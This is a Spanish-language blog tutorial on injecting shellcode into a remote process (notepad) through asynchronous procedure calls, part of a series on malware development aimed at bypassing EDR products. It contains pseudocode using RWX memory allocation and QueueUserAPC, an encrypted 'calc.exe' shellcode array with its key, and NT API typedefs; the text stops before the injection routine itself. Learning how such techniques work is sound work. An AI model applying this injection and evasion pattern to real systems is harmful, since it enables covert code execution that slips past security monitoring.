<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypaseando mis limitaciones | El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bypaseando mis limitaciones" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<meta property="og:description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<link rel="canonical" href="http://localhost:4000/asynchronous_procedure_calls.html" />
<meta property="og:url" content="http://localhost:4000/asynchronous_procedure_calls.html" />
<meta property="og:site_name" content="Bypaseando mis limitaciones" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypaseando mis limitaciones" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR","headline":"Bypaseando mis limitaciones","url":"http://localhost:4000/asynchronous_procedure_calls.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Bypaseando mis limitaciones</h1>
        </a>
        <h2>El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="inyección-en-proceso-externo-mediante-llamada-de-procedimiento-asíncrono">Inyección en proceso externo mediante llamada de procedimiento asíncrono</h1>

<p>Para entender este tipo de inyección, es necesario tener en cuenta que durante el ciclo de vida de los hilos que pertenecen a un proceso en un sistema operativo, existe un estado que se denomina <code class="language-plaintext highlighter-rouge">estado de alerta</code>.
Este estado se genera cuando el hilo trabaja en espera activa, continua su ejecución pero ha invocado a un evento externo y debe recibir un mensaje, una señal, etc.
En general las funciones que geenran, este tipo de estado son las relacionadas con lectura/escritura en disco o las realacionadas con tiempo.</p>

<p>Lo importante es que cuando un hilo entra en este estado de alerta revisa, su cola de eventos y consume por orden FIFO (First In First Out), el primer evento que le llego.</p>

<p>Por lo tanto el flujo asociado a nuestra inyección será el siguiente:</p>
<ul>
  <li>El proceso malicioso, obtiene el pid del proceso objetivo y el hilo que se manipulará.</li>
  <li>El proceso malicioso, realizar reserva de memoria en mapa de memoria del proceso remoto.</li>
  <li>El proceso malicioso, escribira el shellcode en el buffer reservado previamente.</li>
  <li>El proceso malicioso, realiza una llamada asíncrona para encolar la ejecución del shellcode desde el hilo capturado.</li>
</ul>

<p>El principal problema de este tipo de inyección, es que no existen garantias de que el proceso entre en estado alerta para realizar una operación de I/O o de tiempo y por tanto, si no se inyecta en un proceso adecuado (que realice este tipo de operaciones), existe la posibilidad de que el shellcode nunca se llegue a ejecutar.</p>

<h2 id="diagrama-de-flujo">Diagrama de flujo</h2>

<p><img src="/assets/images/APC_diagram.png" alt="Asynchronous procedure calls" /></p>

<h2 id="pseudo-codigo">Pseudo-codigo</h2>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. se obtiene el proceso y el hilo remoto al que queremos invocar</span>
<span class="n">hRemoteProcess</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,...,</span> <span class="n">RemoteProcessID</span><span class="p">)</span>
<span class="n">hThread</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">ThreadID</span><span class="p">)</span>

<span class="c1">// 2. Se reserva memoria para nuestro payload</span>
<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hRemoteProcess</span><span class="p">,...,</span> <span class="n">BufferSize</span><span class="p">,...,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>

<span class="c1">// 3. Se escribe el shellcode en el buffer</span>
<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hRemoteProcess</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">ShellcodeSize</span><span class="p">,...)</span>

<span class="c1">// 4. Se realiza una invocación a APC para el proceso y el hilo remotos</span>
<span class="n">QueueUserAPC</span><span class="p">(</span><span class="n">pRemoteCode</span><span class="p">,</span> <span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>

<span class="c1">// 5. Se requiere que el hilo entre en un estado de alerta para consumir las llamadas APC</span>

</code></pre></div></div>

<h3 id="queueuserapc">QueueUserAPC()</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">QueueUserAPC</span><span class="p">(</span>
    <span class="n">PAPCFUNC</span>  <span class="n">pfnAPC</span><span class="p">,</span>    <span class="c1">// puntero a nuestro código</span>
    <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span>   <span class="c1">// hilo que invocará la función</span>
    <span class="n">ULONG_PTR</span> <span class="n">dwData</span>     <span class="c1">// puntero para el objeto con los parámetros de entrada de la función a ejecutar</span>
<span class="p">);</span>
</code></pre></div></div>
<p>Si la función termina de forma satisfactoria devuelve un valor diferente de 0</p>

<h2 id="código-fuente">Código fuente</h2>

<p>El proceso en el que se va a realiza la inyección es notepad y esta se ejecutará en el momento en el que el usuario pincha sobre guardar el documento:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_UNICODE_STRING</span> <span class="p">{</span>
	<span class="n">USHORT</span> <span class="n">Length</span><span class="p">;</span>
	<span class="n">USHORT</span> <span class="n">MaximumLength</span><span class="p">;</span>
	<span class="n">_Field_size_bytes_part_</span><span class="p">(</span><span class="n">MaximumLength</span><span class="p">,</span> <span class="n">Length</span><span class="p">)</span> <span class="n">PWCH</span> <span class="n">Buffer</span><span class="p">;</span>
<span class="p">}</span> <span class="n">UNICODE_STRING</span><span class="p">,</span> <span class="o">*</span><span class="n">PUNICODE_STRING</span><span class="p">;</span>

<span class="c1">// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_OBJECT_ATTRIBUTES</span> <span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">RootDirectory</span><span class="p">;</span>
	<span class="n">PUNICODE_STRING</span> <span class="n">ObjectName</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Attributes</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">SecurityDescriptor</span><span class="p">;</span> <span class="c1">// PSECURITY_DESCRIPTOR;</span>
	<span class="n">PVOID</span> <span class="n">SecurityQualityOfService</span><span class="p">;</span> <span class="c1">// PSECURITY_QUALITY_OF_SERVICE</span>
<span class="p">}</span> <span class="n">OBJECT_ATTRIBUTES</span><span class="p">,</span> <span class="o">*</span><span class="n">POBJECT_ATTRIBUTES</span><span class="p">;</span>

<span class="c1">// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection</span>
<span class="c1">// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateSection_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">SectionHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">POBJECT_ATTRIBUTES</span> <span class="n">ObjectAttributes</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PLARGE_INTEGER</span> <span class="n">MaximumSize</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">PageAttributess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">SectionAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">FileHandle</span> <span class="n">OPTIONAL</span><span class="p">);</span> 

<span class="c1">// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection</span>
<span class="c1">// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtMapViewOfSection_t</span><span class="p">)(</span>
	<span class="n">HANDLE</span> <span class="n">SectionHandle</span><span class="p">,</span>
	<span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">PVOID</span> <span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span>
	<span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">CommitSize</span><span class="p">,</span>
	<span class="n">PLARGE_INTEGER</span> <span class="n">SectionOffset</span><span class="p">,</span>
	<span class="n">PSIZE_T</span> <span class="n">ViewSize</span><span class="p">,</span>
	<span class="n">DWORD</span> <span class="n">InheritDisposition</span><span class="p">,</span>
	<span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
	<span class="n">ULONG</span> <span class="n">Win32Protect</span><span class="p">);</span>
	
